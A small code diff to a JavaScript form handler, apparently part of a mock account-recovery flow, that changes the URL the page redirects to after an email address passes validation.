@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', function () {
       showError('Please enter a valid email address.');
     } else {
       // ✅ All good - simulate success by redirecting to Step 2
-      window.location.href = 'https://uiux-auth-wolf.onlinetraining.info/navigator/account-recovery-page-2nd-step/';
+      window.location.href = 'https://cloud-miner-landing.vercel.app/ar_r2/r2/account-recovery-page-2nd-step/recovery2.html';
     }
   });
 
